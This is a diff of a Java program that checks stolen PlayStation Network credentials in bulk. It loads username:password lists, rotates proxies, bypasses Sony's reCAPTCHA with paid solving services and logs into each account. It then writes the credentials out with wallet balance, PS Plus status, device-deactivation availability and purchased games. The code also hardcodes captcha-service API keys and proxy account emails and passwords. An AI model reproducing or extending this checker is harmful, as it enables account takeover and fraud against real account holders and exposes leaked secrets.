@@ -23,9 +23,6 @@ import org.jsoup.Jsoup;
 import org.jsoup.nodes.Document;
 import org.jsoup.nodes.Element;
 
-import com.DeathByCaptcha.Captcha;
-import com.DeathByCaptcha.Client;
-import com.DeathByCaptcha.HttpClient;
 import com.anti_captcha.Api.NoCaptcha;
 import com.anti_captcha.Api.NoCaptchaProxyless;
 import com.anti_captcha.Helper.DebugHelper;
@@ -52,17 +49,18 @@ public class Main {
 	static int proxyPort = 80;
 	
     public static void main(String[] args) throws InterruptedException, JSONException, IOException, URISyntaxException {
-        executor = Executors.newFixedThreadPool(4);
+        executor = Executors.newFixedThreadPool(2);
         List<String> proxies = loadProxies();
-    	List<Account> accounts = readAccountsFromFile();
+    	List<Account> accounts = readAccountsFromFile(false);
     	executeWorker(accounts, proxies);
     }
     
+	static int i=0;
+    static List<Account> validAccounts = new ArrayList<Account>();
+
     private static void executeWorker(List<Account> accounts, List<String> proxies) throws IOException, URISyntaxException, InterruptedException {
-    	int i=0;
     	String currentLine;
     	BufferedReader outBr;
-        List<Account> validAccounts = new ArrayList<Account>();
     	final List<Account> accountsProgress = new ArrayList<Account>();
     	try {
     		ClassLoader loader = Thread.currentThread().getContextClassLoader();
@@ -91,83 +89,90 @@ public class Main {
 			e.printStackTrace();
 		}
 
-    	
-    	validAccounts = accounts.stream().filter(new Predicate<Account>() {
-			public boolean test(Account acc) {
-				return !IsDoublon(acc, accountsProgress);
-			}
-		}).collect(Collectors.<Account>toList());
+
+		validAccounts = accounts
+				.stream()
+				.filter(acc -> !IsDoublon(acc, accountsProgress))
+				.collect(Collectors.<Account>toList());
     	    	
     	ClassLoader loaderPw = Thread.currentThread().getContextClassLoader();
 		URL resourcePw = loaderPw.getResource("output.txt");
 		
         for(Account acc : validAccounts) {
-        	if(i % 4 == 0) {
-        		Random random = new Random();
-	        	int randomIndex = random.nextInt(proxies.size());
-	        	proxyHost = proxies.get(randomIndex);
-        	}
-        	
-        	System.out.println("status (" + i + "," + validAccounts.size() + ") checked" );
-        	
-        	pw = new PrintWriter(
-                    new FileWriter(new File(resourcePw.toURI()), true));
+//			executor.execute(new Runnable() {
+				String accountInfosDisplay = "";
+				
+//				@Override
+//				public void run() {
+					Random random = new Random();
+		        	int randomIndex = random.nextInt(proxies.size());
+		        	proxyHost = proxies.get(randomIndex);
+		        	
+		        	System.out.println("status (" + i + "," + validAccounts.size() + ") checked" );
+		        	
+		        	try {
+						pw = new PrintWriter(
+						        new FileWriter(new File(resourcePw.toURI()), true));
+					} catch (IOException | URISyntaxException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
 
-        	String username = acc.getUsername();
-            String password = acc.getPassword();
-            
-            boolean retry = true;
-            while(retry) {
-                String token = "";
-            	// String recaptchaToken = resolveRecaptcha();
-                String recaptchaToken = resolveWith2Captcha();
-	            Object[] result = authenticate(recaptchaToken, username);
-	            if (result != null) {
-		            token = (String) result[0];
-		            Map<String, String> cookies = (Map<String, String>) result[1];
-	            	cookies = getSsoCookie(token, username, password, cookies);
-	                result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D9281f207-82e0-4d11-8d42-f1c66a7959a3");
-	                if(result != null) {
-		                token = (String) result[0];
-		                cookies = (Map<String, String>) result[1];
-		                String languageStr = getLanguage(token, cookies);
-		            	String[] tokens = languageStr.split("-");
-		            	String language = tokens[0];
-		            	String country = tokens[1];
-		            	String balance = getBalance(token, cookies);
-		            	
-		            	Object[] codeAuthResult = authorizeWithCode(false, cookies, '&', '&', "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=code&prompt=none&client_id=f6c7057b-f688-4744-91c0-8179592371d2&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D06b9d0fa-8fa6-4031-81ba-9d522d160844");
-		            	cookies = (Map<String, String>) codeAuthResult[0];
-		            	String authorizationCode = (String) codeAuthResult[1];
-		            	cookies = getSesstionCookies(authorizationCode, token, cookies);
-		            	boolean isPsPlus = isPsPlusMember(token, cookies);
-		            	boolean isPs4Activated = isPs4SystemActivated(token, cookies);
-		            	boolean isNoDesactivateAvailable = isNoDesactivateAvailable(cookies);
-		            	String psPlusStr = isPsPlus ? "pssPlus" : "notPsPlus";
-		            	String ps4ActivatedStr = isPs4Activated ? "Ps4_activated" : "Ps4_not_activated";
-		            	String ps4DesactivateAll = isNoDesactivateAvailable ? "DESAC_ALL" : "NO_DESAC_ALL";
-		            	String profileDisplay = "<-------------- " 
-		            			+ username + ":" + password + "(" + languageStr + "," + balance + "," +
-            					psPlusStr + "," + ps4DesactivateAll + "," + ps4ActivatedStr + ")" 
-            			+ "------------------>";
-		            	pw.println(profileDisplay);
-		            	System.out.println(profileDisplay);
-		                getPurchasedGames(cookies,language,country);
-	                }
-	                else {
-	                	String profileDisplay = "<-------------- " + username + ":" + password + " <<<< ERROR >>>>" 
-		            			+ "------------------>";
-		            	pw.println(profileDisplay);
-		            	System.out.println(profileDisplay);
-	                }
-	                retry = false;
-	            }
-	            else {
-	            	retry = true;
-	            }
-            }
-            pw.close();
-            i++;
+		        	String username = acc.getUsername();
+		            String password = acc.getPassword();
+		            
+		            boolean retry = true;
+		            while(retry) {
+		                String token = "";
+		            	// String recaptchaToken = resolveRecaptcha();
+		                System.out.println("Logging on " + proxyHost + ":" + proxyPort);
+		                String recaptchaToken = resolveWith2Captcha(proxyHost); 
+			            Object[] result = authenticate(recaptchaToken, username);
+			            if (result != null) {
+				            token = (String) result[0];
+				            Map<String, String> cookies = (Map<String, String>) result[1];
+			            	cookies = getSsoCookie(token, username, password, cookies);
+			                result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D9281f207-82e0-4d11-8d42-f1c66a7959a3");
+			                if(result != null) {
+				                token = (String) result[0];
+				                cookies = (Map<String, String>) result[1];
+				            	String balance = getBalance(token, cookies);
+				            	
+				            	Object[] codeAuthResult = authorizeWithCode(cookies, '&', '&', "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=code&prompt=none&client_id=f6c7057b-f688-4744-91c0-8179592371d2&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D06b9d0fa-8fa6-4031-81ba-9d522d160844");
+				            	cookies = (Map<String, String>) codeAuthResult[0];
+				            	String authorizationCode = (String) codeAuthResult[1];
+				            	result = getSesstionCookies(authorizationCode, token, cookies);
+				            	String language = (String) result[0];
+				            	String country = (String) result[1];
+				            	cookies = (Map<String, String>) result[2];
+				            	boolean isPsPlus = isPsPlusMember(token, cookies);
+				            	boolean isPs4Activated = isPs4SystemActivated(token, cookies);
+				            	boolean isNoDesactivateAvailable = isNoDesactivateAvailable(cookies);
+				            	String psPlusStr = isPsPlus ? "pssPlus" : "notPsPlus";
+				            	String ps4ActivatedStr = isPs4Activated ? "Ps4_activated" : "Ps4_not_activated";
+				            	String ps4DesactivateAll = isNoDesactivateAvailable ? "DESAC_ALL" : "NO_DESAC_ALL";
+				            	String profileDisplay = "<-------------- " 
+				            			+ username + ":" + password + "(" + language + "-" + country + "," + balance + "," +
+		            					psPlusStr + "," + ps4DesactivateAll + "," + ps4ActivatedStr + ")" + "------------------>\n";
+				            	accountInfosDisplay += profileDisplay;
+				            	accountInfosDisplay += getEntitlements(cookies,language,country);
+			                }
+			                else {
+			                	String profileDisplay = "<-------------- " + username + ":" + password + " <<<< ERROR >>>>" + "------------------>\n";
+			                	accountInfosDisplay += profileDisplay;
+			                }
+			                retry = false;
+			            }
+			            else {
+			            	retry = true;
+			            }
+		            }
+		            System.out.println(accountInfosDisplay);
+		            pw.println(accountInfosDisplay);
+		            pw.close();
+		            i++;
+//				}
+//			});
         }
     }
     
@@ -203,7 +208,7 @@ public class Main {
 			return proxies;
     }
     
-	private static List<Account> readAccountsFromFile() throws URISyntaxException {
+	private static List<Account> readAccountsFromFile(boolean fromInput) throws URISyntaxException {
 	    List<Account> accounts = new ArrayList<Account>();
 	    
 		BufferedReader br;
@@ -216,7 +221,7 @@ public class Main {
 	        List<Account> checkedAccounts = new ArrayList<Account>();
 			Account account = null;
 			while ((currentLine = br.readLine()) != null) {
-				account = extractListFromInput(currentLine, account);
+				account = fromInput ? extractListFromInput(currentLine, account) : extractListFromOutput(currentLine, account);
 				if(account != null && account.getUsername().compareTo("") != 0 && account.getPassword().compareTo("") != 0) {
 					if(!IsDoublon(account, checkedAccounts)) {
 						accounts.add(new Account(account.getUsername(), account.getPassword()));
@@ -254,7 +259,18 @@ public class Main {
 		}
 		return account;
 	}
-	
+
+	private static Account extractListFromOutput(String currentLine, Account account) {
+		if(currentLine.contains("<------  ") && !currentLine.contains("Error")) {
+			account = new Account();
+			currentLine = currentLine.replaceFirst("<------  ", "");
+			currentLine = currentLine.substring(0, currentLine.indexOf(" ("));
+			account.setUsername(currentLine.split(":")[0]);
+			account.setPassword(currentLine.split(":")[1]);
+		}
+		return account;
+	}
+
 	static boolean IsDoublon(final Account account, List<Account> checkedAccounts) {
 		return !checkedAccounts.parallelStream().filter(
 				new Predicate<Account>() {
@@ -286,9 +302,8 @@ public class Main {
 	}
 	
 	private static boolean isNoDesactivateAvailable(Map<String, String> cookies) {
-        Object[] codeAuthResult = authorizeWithCode(true, cookies, '?', '&', "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?client_id=55950157-ae9d-4b10-b0de-94dbef199f2c&scope=openid%2Ckamaji%3Aprivacy_control%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_set_feed_privacy&state=eyJ0aGVtZSI6ImxpcXVpZCJ9&redirect_uri=https%3A%2F%2Faccount.sonyentertainmentnetwork.com%2Foauth_security_check&response_type=code&prompt=login&ui=pr&noEVBlock=false");
-        cookies = (Map<String, String>) codeAuthResult[0];
-        String authorizationCode = (String) codeAuthResult[1];
+        cookies = authorizeWithCodeRedirect( cookies,  "https://account.sonyentertainmentnetwork.com/liquid/cam/devices/device-list.action?category=psn&displayNavigation=false");
+
 		HttpResponse response;
 	      try {
 	    	HttpRequest request = new HttpRequest("https://account.sonyentertainmentnetwork.com/liquid/cam/devices/device-list.action?category=psn&displayNavigation=false");
@@ -297,16 +312,16 @@ public class Main {
 	  		response = HttpHelper.download(request);
 	  		String html = response.getBody();
 	  		Document doc = Jsoup.parse(html);
-	  		Element deactivateAllDeviceBoxWrapper = doc.getElementById("deactivateAllDeviceBoxWrapper");	  		
+	  		Element deactivateAllDeviceBoxWrapper = doc.getElementById("deactivateAllDeviceBoxWrapper");
 	  		if(deactivateAllDeviceBoxWrapper != null) {
 	  			return true;
 	  		}
-	  		
+
 	  		Element gameMessageButtonWrapper = doc.getElementById("gameMessageButtonWrapper");
 	  		if(gameMessageButtonWrapper != null) {
 	  			return false;
 	  		}
-	  		
+
 	      }catch(Exception e) {}
 		return false;
 
@@ -327,7 +342,7 @@ public class Main {
 		return false;
 	}
 	
-    private static Map<String, String> getSesstionCookies(String authorizationCode, String accountAuthorizationToken, Map<String, String> cookies) {
+    private static Object[] getSesstionCookies(String authorizationCode, String accountAuthorizationToken, Map<String, String> cookies) {
     	
     	List<Map<String, String>> headers = new ArrayList<Map<String, String>>();
         Map<String, String> contentType = new HashMap<String, String>();
@@ -343,7 +358,13 @@ public class Main {
                 headers, jsonPostData);
         try {
             JSONObject postResult = new JSONObject(postResponse.getBody());
-            return postResponse.getCookies();
+            Object[] result = new Object[3];
+            String language = postResult.getJSONObject("data").getString("language");
+            String country = postResult.getJSONObject("data").getString("country");
+            result[0] = language;
+            result[1] = country;
+            result[2] = postResponse.getCookies();
+            return result;
         }catch (Exception e) {}
 		return null;
     }
@@ -365,7 +386,15 @@ public class Main {
 		return null;
     }
     
-    private static void getPurchasedGames(Map<String, String> cookies, String language, String country) {
+    private static boolean checkIfPurchased(String productIdToCheck, List<String> productIds) {
+    	return !productIds
+    		.parallelStream()
+    		.filter(productId -> productId.compareToIgnoreCase(productIdToCheck) == 0)
+    		.collect(Collectors.toList())
+    		.isEmpty();
+    }
+    
+    private static List<String> getPurchasedGames(Map<String, String> cookies, String language, String country) {
 	  Object[] result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D4a21e2e5-70c0-4d35-86cb-50b11e0e6391");
 	  String authorizationToken = (String) result[0];
 	  cookies = (Map<String, String>) result[1];
@@ -374,7 +403,7 @@ public class Main {
 		  String accountId = coreInfosWrapper.getString("accountId");
 		
 		  HttpRequest request = new HttpRequest(
-	          "https://wallets.api.playstation.com/api/transactions/summaries?ownerAccountId=" + accountId + "&limit=500&startDate=2015-02-16T00%3A00%3A00.000%2B0100&endDate=2020-02-16T23%3A59%3A59.999%2B0100&includePurged=false&transactionTypes=PRODUCT_PURCHASE");
+	          "https://wallets.api.playstation.com/api/transactions/summaries?ownerAccountId=" + accountId + "&limit=500&startDate=2014-01-01T00%3A00%3A00.000%2B0100&endDate=2020-02-16T23%3A59%3A59.999%2B0100&includePurged=false&transactionTypes=PRODUCT_PURCHASE,VOUCHER_PURCHASE");
 
 	      request.addHeader("Authorization", "Bearer " + authorizationToken);
 	      request.setCookies(cookies); 
@@ -389,7 +418,6 @@ public class Main {
 	        			.getJSONArray("transactions");
 	        	        
 	        List<String> checkedProductNames = new ArrayList<String>();
-			// String productName = "";
 
 	        for(int i=0; i<transactions.length(); i++) {
 	        	JSONArray orders = 
@@ -403,36 +431,23 @@ public class Main {
 	        					.getJSONObject(j);
 	        		int totalPrice = order.getInt("totalPrice");
 	        		boolean isPSNReduced = false;
-//	        		try {
-//	        			JSONArray orderItemDiscounts = order.getJSONArray("orderItemDiscounts");
-//	        			isPSNReduced = orderItemDiscounts.length() > 0;
-//	        		}catch(JSONException e) {}  
-	        		if(totalPrice > 0) {
-	        			String productName = isAGameProduct(order.getString("skuId"), language, country) ;
-                    	if(!checkedProductNames.contains(productName) && productName != null) {
-            	            pw.println(productName);
-            	            System.out.println(productName);
-                			checkedProductNames.add(productName);
-                		}
-//	        			executor.execute(new Runnable() {
-//							@Override
-//							public void run() {
-//								try {
-//									String productName = isAGameProduct(order.getString("skuId"), language, country) ;
-//			                    	if(!checkedProductNames.contains(productName) && productName != null) {
-//			            	            pw.println(productName);
-//			            	            System.out.println(productName);
-//			                			checkedProductNames.add(productName);
-//			                		}
-//								}catch(JSONException e) {}
-//							}
-//						});
+	        		try {
+	        			JSONArray orderItemDiscounts = order.getJSONArray("orderItemDiscounts");
+	        			isPSNReduced = orderItemDiscounts.length() > 0 
+	        					&& 
+	        					orderItemDiscounts.getJSONObject(0).getInt("discountAmount") > 0;
+	        		}catch(JSONException e) {}
+	        		
+	        		if(totalPrice > 0 || isPSNReduced) {
+						checkedProductNames.add(order.getString("skuId"));
 	        		}
 	        			
 	        	}
 	        }
+	        return checkedProductNames;
 	        
       }catch(Exception e) {e.printStackTrace();}
+	return null;
     }
 
     private static String getBalance(String authorizationToken, Map<String, String> cookies) {
@@ -447,7 +462,7 @@ public class Main {
         try {
             response = HttpHelper.download(request);
             JSONObject responseObject = new JSONObject(response.getBody());
-            double amount = responseObject.getDouble("currentAmount") / 10;
+            double amount = responseObject.getDouble("currentAmount") / 100;
             return amount + " " + responseObject.getString("currencyCode");
 
         } catch (Exception e) {
@@ -476,23 +491,21 @@ public class Main {
         }
     }
     
-    private static Object[] authorizeWithCode(boolean redirectionFlag, Map<String, String> cookies, char startChar, char endChar, String url) {
+    private static Object[] authorizeWithCode(Map<String, String> cookies, char startChar, char endChar, String url) {
         HttpRequest request = new HttpRequest(url);
         try {
             request.setCookies(cookies);
             request.setProxy(proxyHost, proxyPort);
-            request.setFollowRedirects(redirectionFlag);
+            request.setFollowRedirects(false);
             HttpResponse response = HttpHelper.download(request);
             String locationRedirect = response.getHeaders().get("Location");
             Object[] result = new Object[2];
-            if(!redirectionFlag) {
-	            int startIndex = locationRedirect.indexOf(startChar) + 1;
-	            int endIndex = locationRedirect.indexOf(endChar, startIndex);
-	            String authorizationTokenStr = locationRedirect.substring(startIndex, endIndex);
-	            String[] authorizationTokenList = authorizationTokenStr.split("=");
-            	result[1] = authorizationTokenList[1];
-            }
-            result[0] = response.getCookies();
+			result[0] = response.getCookies();
+			int startIndex = locationRedirect.indexOf(startChar) + 1;
+			int endIndex = locationRedirect.indexOf(endChar, startIndex);
+			String authorizationTokenStr = locationRedirect.substring(startIndex, endIndex);
+			String[] authorizationTokenList = authorizationTokenStr.split("=");
+			result[1] = authorizationTokenList[1];
             return result;
         } catch (Exception e) {
             // TODO Auto-generated catch block
@@ -501,7 +514,37 @@ public class Main {
         return null;
     }
 
-    private static Object[] authorize(Map<String, String> cookies, String url) {
+	private static Map<String, String> authorizeWithCodeRedirect(Map<String, String> cookies, String url) {
+			HttpRequest request = new HttpRequest(url);
+			try {
+				request.setCookies(cookies);
+				request.setProxy(proxyHost, proxyPort);
+				request.setFollowRedirects(false);
+				HttpResponse response = HttpHelper.download(request);
+				String locationRedirect = response.getHeaders().get("Location");
+
+				HttpRequest request2 = new HttpRequest(locationRedirect);
+				request2.setProxy(proxyHost, proxyPort);
+				request2.setFollowRedirects(false);
+				request2.setCookies(cookies);
+				HttpResponse response2 = HttpHelper.download(request2);
+				locationRedirect = response2.getHeaders().get("Location");
+
+				HttpRequest request3 = new HttpRequest(locationRedirect);
+				request3.setProxy(proxyHost, proxyPort);
+				request3.setFollowRedirects(false);
+				request3.setCookies(cookies);
+				HttpResponse response3 = HttpHelper.download(request3);
+
+				return response3.getCookies();
+			} catch (Exception e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+			return null;
+	}
+
+		private static Object[] authorize(Map<String, String> cookies, String url) {
         HttpRequest request = new HttpRequest(url);
         try {
             request.setCookies(cookies);
@@ -602,7 +645,7 @@ public class Main {
             }
 
         } catch (Exception e) {
-            //DebugHelper.out("JSON parse problem: " + e.getMessage(), //DebugHelper.Type.ERROR);
+            e.printStackTrace();
 
             return null;
         }
@@ -610,14 +653,14 @@ public class Main {
 
     }
     
-    private static String resolveWith2Captcha() {
+    private static String resolveWith2Captcha(String proxyHost) {
 		String apiKey = "bfe812d7c799c3788b7441d818b17a63";
 		String googleKey = "6Le-UyUUAAAAAIqgW-LsIp5Rn95m_0V0kt_q0Dl5";
 		String pageUrl = "https://id.sonyentertainmentnetwork.com/signin/?response_type=code&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fen-us%2Fhome%2Fgames&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&prompt=login&state=returning&request_locale=en_US&service_entity=urn%3Aservice-entity%3Apsn&hidePageElements=SENLogo&disableLinks=SENLink&ui=pr&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin";
-		String proxyIp = "uk971.nordvpn.com";
+		String proxyIp = proxyHost;
 		String proxyPort = "80";
-		String proxyUser = "curtishuey@gmail.com";
-		String proxyPw = "5nicker5";
+		String proxyUser = "frausing85@hotmail.com";
+		String proxyPw = "hne85jkd";
 
 		/**
 		 * With proxy and user authentication
@@ -643,26 +686,6 @@ public class Main {
 		return null;
     }
 
-//    private static String resolveRecaptcha() throws MalformedURLException, InterruptedException {
-//        //DebugHelper.setVerboseMode(true);
-//
-//        NoCaptchaProxyless api = new NoCaptchaProxyless();
-//        api.setClientKey("466410a2abec5e57da541ed2cf603657");
-//        api.setWebsiteUrl(new URL(
-//                "https://id.sonyentertainmentnetwork.com/signin/?response_type=code&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fen-us%2Fhome%2Fgames&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&prompt=login&state=returning&request_locale=en_US&service_entity=urn%3Aservice-entity%3Apsn&hidePageElements=SENLogo&disableLinks=SENLink&ui=pr&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin"));
-//        api.setWebsiteKey("6Le-UyUUAAAAAIqgW-LsIp5Rn95m_0V0kt_q0Dl5");
-//
-//        if (!api.createTask()) {
-//            DebugHelper.out("API v2 send failed. " + api.getErrorMessage(), DebugHelper.Type.ERROR);
-//        } else if (!api.waitForResult()) {
-//            DebugHelper.out("Could not solve the captcha.", DebugHelper.Type.ERROR);
-//        } else {
-//            DebugHelper.out("Result: " + api.getTaskSolution().getGRecaptchaResponse(), DebugHelper.Type.SUCCESS);
-//            return api.getTaskSolution().getGRecaptchaResponse();
-//        }
-//        return null;
-//    }
-
     public static HttpResponse jsonPostRequest(String url, Map<String, String> cookies, List<Map<String, String>> headers, String jsonPostData) {
 
         HttpRequest request = new HttpRequest(url);
@@ -680,74 +703,26 @@ public class Main {
         try {
             return HttpHelper.download(request);
         } catch (Exception e) {
-            //DebugHelper.out("HTTP problem: " + e.getMessage(), //DebugHelper.Type.ERROR);
+            e.printStackTrace();
             return null;
         }
 
     }
-
-    private static String flatMap(Map<String, String> map) {
-        String result = "";
-        for (Map.Entry<String, String> entry : map.entrySet()) {
-            result += entry.getKey() + "=" + entry.getValue() + ";";
-        }
-        return null;
-
-    }
-    
-    
-
-  private static String isAGameProduct(String productId, String language, String country) {
-		HttpRequest request = new HttpRequest(
-              "https://store.playstation.com/valkyrie-api/" + language + "/" + country + "/999/resolve/" + productId + "?depth=0");
-		request.setTimeout(2_000);
-		request.setProxy(proxyHost, proxyPort);
-		
-   	HttpResponse response;
-      try {
-          response = HttpHelper.download(request);
-          
-          JSONObject entitlementWrapper = new JSONObject(response.getBody());
-          JSONObject mainGameEntitlement = 
-        		  entitlementWrapper
-  			        	.getJSONObject("data")
-  			        	.getJSONObject("relationships")
-  			        	.getJSONObject("children")
-  			        	.getJSONArray("data")
-  			        	.getJSONObject(0);
-          
-          String productType = 
-        		  mainGameEntitlement
-			        	.getString("type");
-          
-      	String productIdIdTruncated = productId.substring(0, productId.lastIndexOf("-"));
-      	long count = entitlementWrapper.getString("id").chars().filter(ch -> ch =='-').count();
-
-         if(productType.compareToIgnoreCase("game") == 0 && (count == 2 || entitlementWrapper.getString("id").compareToIgnoreCase(productIdIdTruncated) == 0)) {
-        	 
-	            String gameTitle = entitlementWrapper
-			    		.getJSONArray("included")
-			    		.getJSONObject(0)
-			    		.getJSONObject("attributes")
-			    		.getString("name");
-    			return gameTitle;
-	            
-         }
-      } catch (Exception e) {}
-	return null;
-  	
-  }
-  
-  private static void getEntitlements(Map<String, String> cookies, String language, String country) {
-  	
+   
+  @SuppressWarnings("unchecked")
+private static String getEntitlements(Map<String, String> cookies, String language, String country) {
+  	String accountGames = "";
   	Object[] result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=d932d31d-e8fc-4058-bd22-16d474938353&scope=kamaji%3Aget_vu_mylibrary%2Ckamaji%3Aget_recs%2Ckamaji%3Aget_internal_entitlements%2Cgenome%3Agene_get%2Cwallets%3Ainstrument.get&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D12730db4-0893-41bc-99e3-0b1a6f5906d7");
   	String authorizationToken = (String) result[0];
+  	cookies = (Map<String, String>) result[1];
   	
   	HttpRequest request = new HttpRequest(
-          "https://commerce.api.np.km.playstation.net/commerce/api/v1/users/me/internal_entitlements?start=0&size=450&revision=0&meta_rev=0&fields=meta_rev%2Ccloud_meta%2Creward_meta%2Cgame_meta%2Cdrm_def%2Cdrm_def.content_type");
+          "https://commerce.api.np.km.playstation.net/commerce/api/v1/users/me/internal_entitlements?start=0&size=2000&revision=0&meta_rev=0&fields=meta_rev%2Ccloud_meta%2Creward_meta%2Cgame_meta%2Cdrm_def%2Cdrm_def.content_type");
 
       request.addHeader("Authorization", "Bearer " + authorizationToken);
       request.setCookies(cookies);
+      request.setProxy(proxyHost, proxyPort);
+      
       HttpResponse response;
       try {
           response = HttpHelper.download(request);
@@ -755,31 +730,58 @@ public class Main {
           
           List<String> products = new ArrayList<String>();
           JSONArray entitlements = entitlementsWrapper.getJSONArray("entitlements");
-          List<String> checkedProductIds = new ArrayList<String>();
+          List<String> checkedProductIds = getPurchasedGames(cookies, language, country);
           for (int i=0; i<entitlements.length(); i++) {
           	JSONObject entitlement = entitlements.getJSONObject(i);
-          	String plateforme = "PS4";
-          	try {
-              	plateforme = 
-              			entitlement
-	                    		.getJSONArray("entitlement_attributes")
-	                    		.getJSONObject(0)
-	                    		.getString("platform_id");
-              	if(plateforme.compareToIgnoreCase("PS4") == 0) {
-              		String productId = entitlement.getString("product_id");
-              		if(!checkedProductIds.contains(productId)) {
-                  		checkedProductIds.add(productId);
-                  		// filterGamesProducts(productId, language, country);
-              		}
-              	}
-          	}catch(JSONException e) { continue; }
+          	boolean isAGame = false;
+			try {
+				isAGame = 
+					entitlement
+			  			.getJSONObject("game_meta")
+			  			.getString("type")
+			  			.compareToIgnoreCase("PS4GD") == 0;
+			}catch(JSONException e) {}
+			
+			if(isAGame 
+              			&& checkIfPurchased(
+	              			entitlement.getString("sku_id"),
+	              			checkedProductIds)
+					) {
+				
+				String gameTitle = entitlement
+                		.getJSONObject("game_meta")
+                		.getString("name");
+				
+				accountGames += gameTitle + "\n";
+			}
           }
+          return accountGames;
 
       } catch (Exception e) {
           DebugHelper.out("JSON parse problem: " + e.getMessage(), DebugHelper.Type.ERROR);
-          return;
+          return "";
       }
 
+  }
+  
+  private static String resolveRecaptcha() throws MalformedURLException, InterruptedException {
+      DebugHelper.setVerboseMode(true);
+
+      NoCaptchaProxyless api = new NoCaptchaProxyless();
+      api.setClientKey("466410a2abec5e57da541ed2cf603657");
+      api.setWebsiteUrl(new URL(
+              "https://id.sonyentertainmentnetwork.com/signin/?response_type=code&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fen-us%2Fhome%2Fgames&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&prompt=login&state=returning&request_locale=en_US&service_entity=urn%3Aservice-entity%3Apsn&hidePageElements=SENLogo&disableLinks=SENLink&ui=pr&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin"));
+      api.setWebsiteKey("6Le-UyUUAAAAAIqgW-LsIp5Rn95m_0V0kt_q0Dl5");
+
+      if (!api.createTask()) {
